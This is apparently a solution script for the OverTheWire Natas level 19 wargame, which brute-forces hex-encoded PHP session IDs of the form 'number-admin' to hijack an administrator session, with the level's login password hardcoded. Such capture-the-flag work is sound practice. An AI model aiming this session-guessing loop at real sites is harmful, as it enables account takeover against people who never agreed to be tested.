import base64
import requests
from requests.auth import HTTPBasicAuth

basic_auth = HTTPBasicAuth('natas19', 'tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr')

count = 1
max_count = 640
url = "http://natas19.natas.labs.overthewire.org/index.php"


def encode_cookie(cookie: str) -> str:
    encoded_cookie = base64.b16encode(cookie.encode('ascii')).lower()
    return encoded_cookie.decode('ascii')


def check_session_id(count: int, username: str) -> str:
    to_encode = str(count) + "-" + username
    cookie = "PHPSESSID=" + encode_cookie(to_encode)
    headers = {'Content-Type': 'text/html; charset=UTF-8',
               'Cookie': cookie}
    body = {"username": "asd", "password": "asd"}
    response = requests.post(url, headers=headers,
                             auth=basic_auth, json=body, verify=False)
    return response.text


if __name__ == '__main__':
    for count in range(max_count + 1):
        text = check_session_id(count, "admin")
        if "You are logged in as a regular user." not in text:
            print(text)
            break
